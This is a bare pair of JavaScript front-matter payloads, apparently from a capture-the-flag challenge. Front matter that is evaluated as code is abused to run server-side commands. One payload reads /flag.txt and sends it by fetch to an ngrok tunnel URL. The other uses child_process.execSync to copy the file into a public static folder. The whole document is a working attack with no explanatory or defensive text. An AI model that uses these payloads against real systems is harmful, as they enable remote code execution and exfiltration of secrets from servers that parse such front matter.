---js
fetch('https://c3c3-98-35-20-77.ngrok.io/?' + require('fs').readFileSync('/flag.txt', {encoding:'utf-8'}))
---

---js
((require("child_process")).execSync("cat /flag.txt > /app/static/flag"))
---
